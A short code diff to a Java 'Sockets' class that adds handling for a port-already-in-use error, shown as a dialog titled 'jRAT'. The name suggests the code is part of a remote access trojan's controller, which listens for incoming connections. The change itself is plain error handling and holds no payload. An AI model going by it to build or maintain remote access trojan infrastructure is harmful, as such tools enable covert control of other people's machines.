@@ -9,8 +9,11 @@ import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.io.Serializable;
+import java.net.BindException;
 import java.util.ArrayList;
 import java.util.List;
+
+import javax.swing.JOptionPane;
 
 public class Sockets extends AbstractSettings implements Serializable {
 
@@ -87,6 +90,9 @@ public class Sockets extends AbstractSettings implements Serializable {
 			try {
 				PortListener connection = new PortListener(name, port, timeout, pass);
 				connection.start();
+			} catch (BindException e) {
+				JOptionPane.showMessageDialog(null, "Port " + port + " is already in use", "jRAT", JOptionPane.ERROR_MESSAGE);
+				e.printStackTrace();
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
